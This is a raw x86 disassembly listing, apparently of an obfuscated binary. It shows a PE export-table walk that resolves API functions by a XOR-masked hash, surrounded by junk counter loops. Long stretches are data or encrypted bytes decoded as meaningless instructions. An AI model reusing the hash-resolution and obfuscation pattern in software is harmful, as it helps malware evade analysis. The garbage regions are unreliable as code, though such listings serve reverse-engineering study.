  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433723,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4336eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43372b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4336e3,0x433647
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433733,0x0
  410325:	mov    eax,ds:0x433733
  41032a:	inc    eax
  41032b:	mov    ds:0x433733,eax
  410330:	cmp    DWORD PTR ds:0x433733,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433733,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433733
  41035a:	inc    eax
  41035b:	mov    ds:0x433733,eax
  410360:	cmp    DWORD PTR ds:0x433733,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4336e3
  410379:	sbb    eax,DWORD PTR ds:0x433763
  41037f:	mov    ds:0x4336e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4336ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433667,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433647,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433647
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433647,eax
  4103c0:	cmp    DWORD PTR ds:0x433647,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433647,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433647,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433647
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433647,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433757,0x1e
  41040d:	cmp    DWORD PTR ds:0x433757,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433757,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433974
  41042f:	push   0x43365f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433757,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433757
  41044c:	dec    eax
  41044d:	mov    ds:0x433757,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433757
  41045a:	dec    eax
  41045b:	mov    ds:0x433757,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433757,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4336a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43369b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4336e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	test   eax,0x994333a5
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	(bad)  
  4104ca:	jmp    0x970b4296
  4104cf:	adc    cl,BYTE PTR [ecx-0x3]
  4104d2:	xchg   edx,eax
  4104d3:	aaa    
  4104d4:	pop    esi
  4104d5:	mov    DWORD PTR [edx],edi
  4104d7:	or     BYTE PTR [esi-0x4711e58d],0xb4
  4104de:	int    0xb9
  4104e0:	adc    DWORD PTR [edx+0x2e],ebx
  4104e3:	test   ecx,esi
  4104e5:	bound  edi,QWORD PTR [ebx-0x2e9390cc]
  4104eb:	pop    eax
  4104ec:	xchg   edx,eax
  4104ed:	cmp    ecx,DWORD PTR [eax+0x7a]
  4104f0:	in     eax,dx
  4104f1:	and    DWORD PTR [ebp+0xb],ebx
  4104f4:	jle    0x4104c1
  4104f6:	dec    esp
  4104f7:	inc    ebp
  4104f8:	cmp    edi,DWORD PTR [ecx+0x27]
  4104fb:	inc    ecx
  4104fc:	adc    al,bh
  4104fe:	push   esi
  4104ff:	dec    ebp
  410500:	sahf   
  410501:	in     eax,dx
  410502:	outs   dx,DWORD PTR ds:[esi]
  410503:	or     DWORD PTR [esi-0x322cddf2],0xd4cd00e3
  41050d:	pop    edx
  41050e:	sub    esi,DWORD PTR ds:0xe297488e
  410514:	inc    eax
  410515:	pop    ss
  410516:	mov    ebx,DWORD PTR [esi-0x5cdfb9d2]
  41051c:	sub    BYTE PTR [ebp+0xe],al
  41051f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410520:	lahf   
  410521:	(bad)  
  410522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410523:	out    dx,eax
  410524:	cli    
  410525:	pop    ss
  410526:	xchg   edx,eax
  410527:	inc    edx
  410528:	in     eax,0xae
  41052a:	mov    ds:0x58e011f1,eax
  41052f:	lea    edx,[esi-0x365d5280]
  410535:	mov    eax,ds:0x8264d46f
  41053a:	aas    
  41053b:	add    eax,DWORD PTR [edx]
  41053d:	inc    esp
  41053e:	and    DWORD PTR [edx+0x20a13098],ebp
  410544:	inc    ebx
  410545:	cwde   
  410546:	mov    dh,0x89
  410548:	dec    ecx
  410549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054a:	dec    edx
  41054b:	inc    eax
  41054c:	sub    eax,0x9d0add5c
  410551:	iret   
  410552:	pop    es
  410553:	or     al,0x4d
  410555:	fldcw  WORD PTR [esi-0x5752e5d1]
  41055b:	adc    DWORD PTR [ecx+0x3c],eax
  41055e:	in     eax,dx
  41055f:	(bad)  
  410560:	stos   BYTE PTR es:[edi],al
  410561:	mov    dl,0x8b
  410563:	inc    esp
  410564:	cs lahf 
  410566:	or     DWORD PTR [edx+0x488e630c],edi
  41056c:	or     eax,0x3eedeeb
  410571:	pop    edi
  410572:	dec    ebx
  410573:	push   edi
  410574:	test   esi,ebp
  410576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410577:	sbb    eax,0x1e297cd1
  41057c:	(bad)  ds:0xd8d13951
  410582:	ds jb  0x410594
  410585:	add    edi,edx
  410587:	test   DWORD PTR [esi+0x358d1fcd],eax
  41058d:	adc    eax,0xfa0cfc1c
  410592:	in     al,dx
  410593:	cli    
  410594:	push   ecx
  410595:	push   es
  410596:	push   DWORD PTR [edx+esi*2]
  410599:	sbb    BYTE PTR [edx+0x51],bl
  41059c:	popa   
  41059d:	out    0x5,eax
  41059f:	xor    eax,0xfeaf6c92
  4105a4:	enter  0xa429,0x3d
  4105a8:	out    0xd1,al
  4105aa:	stos   BYTE PTR es:[edi],al
  4105ab:	sbb    eax,0x1055e75a
  4105b0:	mov    bh,0x86
  4105b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105b3:	mov    BYTE PTR [esi+esi*4+0x1d3440da],0x9f
  4105bb:	inc    ebx
  4105bc:	sbb    bh,ch
  4105be:	adc    eax,0xab56e083
  4105c3:	dec    edi
  4105c4:	lds    eax,FWORD PTR [ecx-0x242edb2]
  4105ca:	lock les edx,FWORD PTR [edi+0x40]
  4105ce:	lock mov ebp,DWORD PTR [esi]
  4105d1:	dec    esp
  4105d2:	or     BYTE PTR [eax-0x58],dl
  4105d5:	aaa    
  4105d6:	add    eax,DWORD PTR [esi-0x6]
  4105d9:	xor    DWORD PTR [ebx],ebp
  4105db:	cmp    al,0xc4
  4105de:	ret    0x8079
  4105e1:	icebp  
  4105e2:	mov    ebp,0x8b9135d5
  4105e7:	inc    ebp
  4105e8:	cld    
  4105e9:	sbb    DWORD PTR ds:0x4336d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43364f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43372f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43372f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4336df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x41068a
  410648:	aas    
  410649:	stc    
  41064a:	movsx  edi,WORD PTR [ecx+0x7f127c7c]
  410651:	jl     0x4106cf
  410653:	mov    ecx,0xf61c7096
  410658:	(bad)  
  410659:	(bad)
  41065c:	ins    BYTE PTR es:[edi],dx
  41065d:	or     edx,DWORD PTR [edi]
  41065f:	clc    
  410660:	add    cl,dh
  410662:	adc    bl,BYTE PTR [ecx+0x19636b3e]
  410668:	pop    esp
  410669:	push   edx
  41066a:	dec    ebx
  41066b:	add    eax,0x4e737599
  410670:	cmp    al,0x4e
  410672:	imul   edi,esp,0x2
  410675:	pop    ecx
  410676:	(bad)  
  410677:	jmp    0x41068b
  410679:	mov    ebp,DWORD PTR ds:0x54067e4e
  41067f:	retf   
  410680:	icebp  
  410681:	sbb    bl,BYTE PTR [ecx]
  410683:	loope  0x410608
  410685:	xor    eax,0x62fbb582
  41068a:	push   ebp
  41068b:	std    
  41068c:	pop    es
  41068d:	ret    
  41068e:	sbb    eax,0x679c9e6e
  410693:	xchg   DWORD PTR [ecx],edx
  410695:	cdq    
  410696:	mov    WORD PTR [edx-0x2f],cs
  410699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41069a:	inc    ebp
  41069b:	push   es
  41069c:	shr    DWORD PTR [ebx+0x7e],1
  41069f:	lods   eax,DWORD PTR es:[esi]
  4106a1:	or     esi,DWORD PTR [ebp-0x3ef3fedd]
  4106a7:	add    BYTE PTR ds:0xf5b7cf0b,ah
  4106ad:	outs   dx,BYTE PTR ds:[esi]
  4106ae:	dec    eax
  4106af:	ins    DWORD PTR es:[edi],dx
  4106b0:	adc    bl,BYTE PTR [ecx+edx*2]
  4106b3:	xchg   edi,eax
  4106b4:	aam    0x74
  4106b6:	pop    ss
  4106b7:	sub    dl,BYTE PTR [eax+eiz*4+0x70]
  4106bb:	pushf  
  4106bc:	mov    esp,0x76f02db4
  4106c1:	pop    ebp
  4106c2:	lds    eax,FWORD PTR es:[esi-0x6e928f6d]
  4106c9:	or     esp,DWORD PTR [esi+eax*1-0x813fa8]
  4106d0:	cmp    DWORD PTR ds:0x7683bfe6,0x2
  4106d7:	pop    ecx
  4106d8:	adc    cl,BYTE PTR [eax]
  4106da:	test   BYTE PTR [ebp-0x7d26ef60],cl
  4106e0:	and    eax,0x9bfdd0ed
  4106e5:	leavew 
  4106e7:	mov    ah,BYTE PTR [edx+eax*8-0x684a19d3]
  4106ee:	hlt    
  4106ef:	hlt    
  4106f0:	outs   dx,DWORD PTR ds:[esi]
  4106f1:	dec    esi
  4106f2:	mov    bh,0x5d
  4106f4:	add    ebx,ebp
  4106f6:	add    bh,dl
  4106f8:	loopne 0x41075e
  4106fa:	sbb    dl,ah
  4106fc:	add    BYTE PTR [esp+ecx*2],cl
  4106ff:	cmp    DWORD PTR [eax-0x3d],eax
  410702:	cmp    esi,DWORD PTR [ecx+0x44]
  410705:	rcl    DWORD PTR [esi],0xf7
  410708:	frstor [ebp-0x44]
  41070b:	xor    eax,edx
  41070d:	dec    esp
  41070e:	nop
  41070f:	mov    ebp,0x7d499e32
  410714:	cmp    DWORD PTR [esi],esp
  410716:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  410718:	clc    
  410719:	jle    0x410755
  41071b:	bound  ebx,QWORD PTR [esi]
  41071d:	mov    DWORD PTR [edi-0x52e1aaf5],esp
  410723:	rcl    ebx,1
  410725:	pop    eax
  410726:	loopne 0x410790
  410728:	dec    ebp
  410729:	out    0xde,al
  41072b:	push   ss
  41072c:	mov    ebx,0x80661c95
  410731:	and    ah,BYTE PTR [edi]
  410733:	nop
  410734:	fisttp WORD PTR [esi+0xcfaa24]
  41073a:	fistp  DWORD PTR [eax+0x1ebd2b03]
  410740:	sbb    al,ah
  410742:	mov    cs,ebx
  410744:	bound  edi,QWORD PTR [ecx]
  410746:	cmp    DWORD PTR [edx],edx
  410748:	lods   al,BYTE PTR ds:[esi]
  410749:	dec    eax
  41074a:	shl    DWORD PTR [edi+0x27a31f9f],cl
  410750:	pop    esp
  410751:	push   cs
  410752:	out    0xc4,al
  410754:	ret    
  410755:	mov    DWORD PTR [esp+edi*8+0x37],edi
  410759:	xchg   esp,eax
  41075a:	daa    
  41075b:	test   al,0x22
  41075d:	gs imul ecx,ecx,0xffffffd1
  410761:	jl     0x41070c
  410763:	ins    DWORD PTR es:[edi],dx
  410764:	hlt    
  410765:	mov    ebx,DWORD PTR [esi]
  410767:	pop    edx
  410768:	(bad)  
  410769:	and    cl,BYTE PTR [ebx+edi*8-0x7fa8aed2]
  410770:	loope  0x4106fd
  410772:	dec    ebp
  410773:	in     al,dx
  410774:	add    DWORD PTR ds:0x433667,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433663,0x43364f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4336a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433763
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x31f2ac5a,eax
  4107e5:	fnstsw WORD PTR [ebp+ebx*2+0x127c7cb8]
  4107ec:	jg     0x41086a
  4107ee:	jl     0x4107b8
  4107f0:	ja     0x410844
  4107f2:	push   0x49
  4107f4:	and    ebx,DWORD PTR [esi+0x1a4ff3dc]
  4107fa:	shr    edx,1
  4107fc:	adc    eax,0x225a6c01
  410801:	jns    0x4107dd
  410803:	mov    BYTE PTR [ecx+0x7540924],bh
  410809:	ret    0xdc41
  41080c:	gs out 0xbd,al
  41080f:	or     al,0x84
  410811:	pop    ds
  410812:	push   ebp
  410813:	dec    BYTE PTR [edx+0x34fb6221]
  410819:	sbb    al,bl
  41081b:	lea    edi,[ebx+0x22]
  41081e:	push   esp
  41081f:	fxch   st(6)
  410821:	pop    es
  410822:	sub    eax,DWORD PTR [ecx+0x69]
  410825:	imul   esp,DWORD PTR [ecx+0x70],0x2efb243e
  41082c:	sbb    eax,0x904e8fcc
  410831:	ret    
  410832:	call   0x24dcf002
  410837:	push   edi
  410838:	xchg   DWORD PTR [edx+0x35],ecx
  41083b:	jns    0x410871
  41083d:	mov    eax,es
  41083f:	les    esp,FWORD PTR [esi]
  410841:	jno    0x41086b
  410843:	ret    0x916a
  410846:	xor    esp,DWORD PTR [eax]
  410848:	ds mov esi,0x5322af34
  41084e:	stos   DWORD PTR es:[edi],eax
  41084f:	out    dx,eax
  410850:	jmp    0xddc4:0x443a1f3d
  410857:	jl     0x410825
  410859:	push   es
  41085a:	test   eax,0x72ef3506
  41085f:	mov    dl,0x5d
  410861:	cmp    BYTE PTR [ecx-0x80],ch
  410864:	das    
  410865:	mov    ch,0xc4
  410867:	stc    
  410868:	push   edx
  410869:	inc    esp
  41086b:	ds mov ch,0x9a
  41086e:	in     al,dx
  41086f:	inc    ebx
  410870:	(bad)  
  410871:	fild   QWORD PTR [esi+ebp*4-0x78]
  410875:	adc    DWORD PTR [ecx-0x7f43574c],esp
  41087b:	arpl   si,di
  41087d:	xchg   esi,eax
  41087e:	sbb    esi,DWORD PTR [edx+0x63]
  410881:	push   esp
  410882:	daa    
  410883:	and    BYTE PTR [eax+0x683f08b3],bl
  410889:	gs push ebp
  41088b:	(bad)  
  41088c:	fcos   
  41088e:	xchg   edi,eax
  41088f:	retf   0x3a8f
  410892:	lds    esi,FWORD PTR [esp+edi*4]
  410895:	cmp    BYTE PTR ds:[ebp+0x17d325b1],dl
  41089c:	scas   eax,DWORD PTR es:[edi]
  41089d:	xor    al,0xff
  41089f:	in     eax,0x97
  4108a1:	xor    DWORD PTR [ebx*4+0x31c8450b],ecx
  4108a8:	loop   0x410859
  4108aa:	aam    0x35
  4108ac:	sbb    DWORD PTR [ecx],0xffffffd0
  4108af:	sbb    al,BYTE PTR ds:0x8a89c586
  4108b5:	sub    dl,BYTE PTR [esi]
  4108b7:	cli    
  4108b8:	popf   
  4108b9:	scas   eax,DWORD PTR es:[edi]
  4108ba:	xchg   edi,eax
  4108bb:	fsubr  DWORD PTR [eax]
  4108bd:	pop    esp
  4108be:	enter  0xf8d6,0x93
  4108c2:	mov    al,ds:0xb9395369
  4108c7:	pushf  
  4108c8:	xchg   esi,eax
  4108c9:	std    
  4108ca:	mov    eax,0xb5770b47
  4108cf:	xor    eax,0x47215c5
  4108d4:	stos   DWORD PTR es:[edi],eax
  4108d5:	jns    0x41092d
  4108d7:	and    esi,ecx
  4108d9:	cmp    al,0xbb
  4108db:	daa    
  4108dc:	fwait
  4108dd:	in     al,dx
  4108de:	jns    0x410885
  4108e0:	popf   
  4108e1:	dec    eax
  4108e2:	rol    DWORD PTR [ebp-0x4a965430],0x8d
  4108e9:	jmp    0xe8ab:0xc6d721ce
  4108f0:	add    ebp,esi
  4108f2:	xor    al,0xc4
  4108f4:	lock mul DWORD PTR [eax-0x6f]
  4108f8:	(bad)  
  4108f9:	xor    BYTE PTR [ecx-0xb],0x86
  4108fd:	fdiv   DWORD PTR [ebx+eiz*1]
  410900:	jp     0x4108b5
  410902:	xchg   DWORD PTR ds:0x442865b6,ecx
  410908:	xor    dl,ch
  41090a:	mov    esi,0x4d8bab2b
  41090f:	or     BYTE PTR [ebx],al
  410911:	or     al,0xb8
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [edx+0x7396aea4],ah
  4109a2:	mov    ebx,0x7f127c7c
  4109a7:	jl     0x410a25
  4109a9:	mov    esi,DWORD PTR [eax+edx*2]
  4109ac:	fcomp  QWORD PTR [edx-0x7a]
  4109af:	lahf   
  4109b0:	enter  0xfa96,0xc8
  4109b4:	clc    
  4109b5:	sub    dh,ah
  4109b7:	daa    
  4109b8:	pushf  
  4109b9:	pusha  
  4109ba:	lahf   
  4109bb:	sub    ebx,DWORD PTR fs:[edi-0xc5d160d]
  4109c2:	adc    ebp,DWORD PTR [edi-0x3ccf3bd4]
  4109c8:	add    DWORD PTR [ebp-0x4b],esi
  4109cb:	lods   eax,DWORD PTR ds:[esi]
  4109cc:	ds pop ebp
  4109ce:	mov    ecx,0x15eca266
  4109d3:	pop    es
  4109d4:	fcmovne st,st(6)
  4109d6:	outs   dx,BYTE PTR ds:[esi]
  4109d7:	les    ebp,FWORD PTR [edi+0x5f92d681]
  4109dd:	and    al,0x86
  4109df:	call   0x8c5bedcf
  4109e4:	fcom   st(5)
  4109e6:	mov    WORD PTR [esi-0x79],fs
  4109e9:	(bad)  [eax+0x57c2eb2]
  4109ef:	mov    dl,0x81
  4109f1:	xchg   ebx,eax
  4109f2:	test   al,0x82
  4109f4:	dec    ecx
  4109f5:	cli    
  4109f6:	mov    BYTE PTR [edi],cl
  4109f8:	je     0x4109e2
  4109fa:	stc    
  4109fb:	dec    eax
  4109fc:	xchg   DWORD PTR [edi-0x390cc365],esi
  410a02:	mov    cl,0x6b
  410a04:	out    dx,eax
  410a05:	sbb    BYTE PTR [edx+eiz*4],0x88
  410a09:	ins    DWORD PTR es:[edi],dx
  410a0a:	jo     0x410a81
  410a0c:	imul   edx,ecx,0x76
  410a0f:	in     al,0xa2
  410a11:	xchg   ecx,eax
  410a12:	adc    ch,bh
  410a14:	gs dec eax
  410a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a17:	cdq    
  410a18:	xor    DWORD PTR [ebp+ebx*8-0x56],edx
  410a1c:	adc    DWORD PTR [eax],eax
  410a1e:	adc    BYTE PTR [ebp-0x21d657fe],ah
  410a24:	aam    0x78
  410a26:	fild   QWORD PTR [ebx]
  410a28:	ss pop ss
  410a2a:	sub    eax,0xb1fe5d6f
  410a2f:	adc    eax,0x1d1b4a76
  410a34:	adc    ebp,DWORD PTR [ecx]
  410a36:	mov    edi,0x8ae759ba
  410a3b:	scas   al,BYTE PTR es:[edi]
  410a3c:	sbb    BYTE PTR [eax+eax*2],ch
  410a3f:	es pop esp
  410a41:	retf   
  410a42:	mov    edx,0x188dbebf
  410a47:	lds    esi,FWORD PTR [edi+eax*1-0x1e]
  410a4b:	adc    al,0x6a
  410a4d:	mov    bl,0xf3
  410a4f:	nop
  410a50:	and    DWORD PTR [ecx+ecx*2],0x11
  410a54:	out    dx,eax
  410a55:	mov    bl,0x68
  410a57:	mov    dl,0x1a
  410a59:	hlt    
  410a5a:	inc    esi
  410a5b:	jae    0x410a72
  410a5d:	fidivr DWORD PTR [ecx]
  410a5f:	imul   ebx,DWORD PTR [edx+0x2c],0xffffffce
  410a63:	pusha  
  410a64:	retf   
  410a65:	and    al,0xfe
  410a67:	stos   DWORD PTR es:[edi],eax
  410a68:	and    BYTE PTR [ebx+0x420b04c9],dh
  410a6e:	imul   eax,DWORD PTR [edi],0x61da4e58
  410a74:	aas    
  410a75:	mov    BYTE PTR [ebx],ah
  410a77:	xor    BYTE PTR [ecx+0x7c],cl
  410a7a:	jge    0x410ab0
  410a7c:	or     eax,DWORD PTR [ecx+ecx*1-0x2c]
  410a80:	inc    ebx
  410a81:	cmp    eax,0xc42dcad
  410a86:	jl     0x410aba
  410a88:	cmp    eax,0x7e400f77
  410a8d:	pop    edx
  410a8e:	mov    al,0x7e
  410a90:	pop    esp
  410a91:	cs aam 0x6c
  410a94:	ja     0x410a32
  410a96:	mov    ebp,0xcbb433c6
  410a9b:	js     0x410aa8
  410a9d:	je     0x410ae9
  410a9f:	pop    ss
  410aa0:	mov    eax,ds:0x5e24d553
  410aa5:	lods   eax,DWORD PTR ds:[esi]
  410aa6:	inc    esi
  410aa7:	loope  0x410afb
  410aa9:	xchg   esp,eax
  410aaa:	add    al,BYTE PTR [ecx+edi*2+0x6d]
  410aae:	cmp    eax,0x2f8a4ccf
  410ab3:	mov    ds:0xeb949fad,al
  410ab8:	popa   
  410ab9:	stos   DWORD PTR es:[edi],eax
  410aba:	js     0x410ad2
  410abc:	scas   eax,DWORD PTR es:[edi]
  410abd:	push   0xffffff9b
  410abf:	mov    al,0xd8
  410ac1:	cmp    ch,BYTE PTR [edi-0x1532fdd1]
  410ac7:	add    eax,DWORD PTR [ebp+0x8]
  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fdivr  st(2),st
  410af2:	xchg   ecx,ebp
  410af4:	fst    DWORD PTR [ecx]
  410af6:	inc    ebp
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410ad1
  410afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aff:	mov    ebx,0xea928a9f
  410b04:	add    cl,bh
  410b06:	add    eax,0xe562fef5
  410b0b:	ss mov ebx,0x4f6cae06
  410b11:	pop    eax
  410b12:	imul   edx,DWORD PTR [ebp+0x5b],0x1e4e9b52
  410b19:	mov    al,0xd3
  410b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b1c:	(bad)  
  410b1d:	ficomp DWORD PTR [ebx-0x37]
  410b20:	mov    ?,WORD PTR [eax+0x1baf4071]
  410b26:	xchg   edi,eax
  410b27:	(bad)  
  410b28:	popf   
  410b29:	adc    eax,0xf488ee4c
  410b2e:	fs inc ecx
  410b30:	in     al,0x8f
  410b32:	(bad)  
  410b33:	hlt    
  410b34:	add    ebp,esi
  410b36:	jp     0x410ba5
  410b38:	loop   0x410b30
  410b3a:	mov    ebp,0x25a4141
  410b3f:	jg     0x410b35
  410b41:	(bad)  
  410b42:	mov    ch,0xcd
  410b44:	pushf  
  410b45:	jbe    0x410b0c
  410b47:	dec    esp
  410b48:	mov    ecx,0xe4068661
  410b4d:	leave  
  410b4e:	xchg   ecx,eax
  410b4f:	add    DWORD PTR [ecx-0x48],ebp
  410b52:	pop    es
  410b53:	xchg   ecx,eax
  410b54:	dec    edx
  410b55:	push   edi
  410b56:	xchg   ebx,eax
  410b57:	and    DWORD PTR [ebx+0x784f10ff],ebp
  410b5d:	jnp    0x410b95
  410b5f:	sbb    bh,BYTE PTR ds:0x3ddbedde
  410b65:	inc    edi
  410b66:	xchg   DWORD PTR [ebx],ebx
  410b68:	cdq    
  410b69:	cmp    BYTE PTR ds:0xe92a3b54,dl
  410b6f:	xchg   edx,eax
  410b70:	jmp    0x33cb3154
  410b75:	bound  ecx,QWORD PTR [ebx-0x17b7ca84]
  410b7b:	add    esi,DWORD PTR [esi-0x6]
  410b7e:	mov    bh,0x3d
  410b80:	(bad)  
  410b81:	sbb    al,0xb3
  410b83:	jecxz  0x410be4
  410b85:	sub    al,0x1b
  410b87:	xchg   edi,eax
  410b88:	and    al,BYTE PTR [ecx+0x62]
  410b8b:	je     0x410b5f
  410b8d:	sub    esp,DWORD PTR [esi+0x55]
  410b90:	ins    DWORD PTR es:[edi],dx
  410b91:	jge    0x410b73
  410b93:	pop    ebp
  410b94:	test   BYTE PTR [eax+eax*2-0x35],dl
  410b98:	inc    eax
  410b99:	or     dh,ah
  410b9b:	mov    ah,BYTE PTR [esi+0x333bf3d5]
  410ba1:	(bad)  
